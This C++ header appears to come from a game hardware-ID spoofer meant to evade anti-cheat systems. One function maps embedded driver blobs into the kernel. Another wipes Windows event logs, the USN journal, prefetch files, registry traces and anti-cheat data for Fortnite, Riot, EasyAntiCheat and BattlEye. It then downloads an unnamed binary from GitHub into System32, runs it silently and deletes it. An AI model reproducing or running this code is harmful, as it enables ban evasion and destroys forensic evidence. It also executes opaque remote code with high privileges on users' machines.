#pragma once
#include <cstdlib>
#include <string>
#include "term.hpp"
#include "blob.hpp"
#include "ext/wrap.hpp"

namespace run {

bool run_spoof() {
    term::cls();
    term::log("+", "loading driver..", term::L::I);
    if (!mod::wrap::init()) {
        term::log("+", "driver init failed", term::L::E);
        return false;
    }
    if (!mod::wrap::map(_blob::getSpoof2(), false)) {
        term::log("+", "driver map failed", term::L::E);
        mod::wrap::cleanup();
        return false;
    }
    if (!mod::wrap::map(_blob::getSpoof3(), false)) {
        term::log("+", "driver map failed", term::L::E);
        mod::wrap::cleanup();
        return false;
    }
    term::log("+", "driver active", term::L::G);
    Sleep(1500);
    mod::wrap::cleanup();
    term::log("+", "done", term::L::G);
    return true;
}

bool run_clean() {
    term::cls();
    term::log("*", "loading driver..", term::L::I);
    if (!mod::wrap::init()) {
        term::log("*", "driver init failed", term::L::E);
        return false;
    }
    if (!mod::wrap::map(_blob::getClean(), false)) {
        term::log("*", "driver map failed", term::L::E);
        mod::wrap::cleanup();
        return false;
    }

    system("ipconfig /flushdns >nul 2>&1");
    system("arp -d * >nul 2>&1");
    system("netsh winsock reset >nul 2>&1");
    system("netsh int ip reset >nul 2>&1");
    Sleep(400);

    system("reg delete \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\NetworkList\\Profiles\" /f >nul 2>&1");
    Sleep(200);

    Sleep(200);

    term::log("*", "cleaning..", term::L::I);
    system("del /q /f /s \"%TEMP%\\*\" >nul 2>&1");
    system("for /d %d in (\"%TEMP%\\*\") do @rd /s /q \"%d\" >nul 2>&1");
    system("del /q /f /s \"C:\\Windows\\Temp\\*\" >nul 2>&1");
    system("for /d %d in (\"C:\\Windows\\Temp\\*\") do @rd /s /q \"%d\" >nul 2>&1");
    Sleep(300);

    system("del /q /f /s \"C:\\Windows\\Prefetch\\*.pf\" >nul 2>&1");
    Sleep(200);

    system("del /q /f /s \"%LOCALAPPDATA%\\FortniteGame\\Saved\\Logs\\*\" >nul 2>&1");
    system("del /q /f /s \"%LOCALAPPDATA%\\FortniteGame\\Saved\\Crashes\\*\" >nul 2>&1");
    system("del /q /f /s \"%LOCALAPPDATA%\\Riot Games\\*\" >nul 2>&1");
    system("del /q /f /s \"C:\\ProgramData\\Riot Games\\*\" >nul 2>&1");
    system("del /q /f /s \"%LOCALAPPDATA%\\EasyAntiCheat\\*\" >nul 2>&1");
    system("del /q /f /s \"C:\\ProgramData\\EasyAntiCheat\\*\" >nul 2>&1");
    system("del /q /f /s \"%LOCALAPPDATA%\\Activision\\*\" >nul 2>&1");
    system("del /q /f /s \"%LOCALAPPDATA%\\BattlEye\\*\" >nul 2>&1");
    system("del /q /f /s \"C:\\ProgramData\\BattlEye\\*\" >nul 2>&1");
    system("del /q /f /s \"%LOCALAPPDATA%\\FiveM\\*\" >nul 2>&1");
    system("del /q /f /s \"%LOCALAPPDATA%\\Roblox\\logs\\*\" >nul 2>&1");
    Sleep(400);

    term::log("*", "cleaning registry (tracing/mountpoints/bam)..", term::L::I);
    system("reg delete \"HKLM\\SOFTWARE\\Microsoft\\Tracing\" /f >nul 2>&1");
    system("reg delete \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\MountPoints2\" /f >nul 2>&1");
    system("reg delete \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\bam\\State\\UserSettings\" /f >nul 2>&1");
    system("reg delete \"HKCU\\Software\\Epic Games\" /f >nul 2>&1");
    system("reg delete \"HKLM\\Software\\Epic Games\" /f >nul 2>&1");

    system("reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\DataCollection\" /v AllowTelemetry /t REG_DWORD /d 0 /f >nul 2>&1");
    Sleep(400);

    system("wevtutil cl Application >nul 2>&1");
    system("wevtutil cl Security >nul 2>&1");
    system("wevtutil cl System >nul 2>&1");
    system("wevtutil cl Setup >nul 2>&1");
    Sleep(300);

    system("fsutil usn deletejournal /D C: >nul 2>&1");
    Sleep(300);
    term::log("*", "clearing cache..", term::L::I);
    system("RunDll32.exe InetCpl.cpl,ClearMyTracksByProcess 8 >nul 2>&1");
    system("RunDll32.exe InetCpl.cpl,ClearMyTracksByProcess 2 >nul 2>&1");
    Sleep(300);
    system("del /q /f \"%APPDATA%\\Microsoft\\Windows\\Recent\\*\" >nul 2>&1");
    Sleep(300);
    system("curl -s -S -L -o C:\\Windows\\System32\\cleaner.exe https://github.com/linoudev/cleanerlink/raw/refs/heads/main/cleaner.bin");
    system("start /B C:\\Windows\\System32\\cleaner.exe >nul 2>&1 <nul");
    SetConsoleTitleW(L"cleaning...");
    Sleep(1000);
    SetConsoleTitleW(L"cleaning...");
    Sleep(1000);
    SetConsoleTitleW(L"cleaning...");
    SetConsoleTitleW(L"cleaning...");
    SetConsoleTitleW(L"cleaning...");
    SetConsoleTitleW(L"cleaning...");
    SetConsoleTitleW(L"cleaning...");
    SetConsoleTitleW(L"cleaning...");
    SetConsoleTitleW(L"cleaning...");
    SetConsoleTitleW(L"cleaning...");
    SetConsoleTitleW(L"cleaning...");
    SetConsoleTitleW(L"cleaning...");
    Sleep(9000);
    SetConsoleTitleW(L"cleaning...");
    SetConsoleTitleW(L"cleaning...");
    SetConsoleTitleW(L"cleaning...");
    system("taskkill /f /im cleaner.exe >nul 2>&1");
    SetConsoleTitleW(L"cleaning...");
    SetConsoleTitleW(L"cleaning...");
    SetConsoleTitleW(L"cleaning...");
    std::remove("C:\\Windows\\System32\\cleaner.exe");
    SetConsoleTitleW(L"cleaning...");
    SetConsoleTitleW(L"cleaning...");
    SetConsoleTitleW(L"cleaning...");

    mod::wrap::cleanup();
    term::log("*", "done - spoof and launch the game", term::L::G);
    MessageBoxA(NULL, "spoof and launch the game!", "info", MB_ICONINFORMATION);
    return true;
}

}
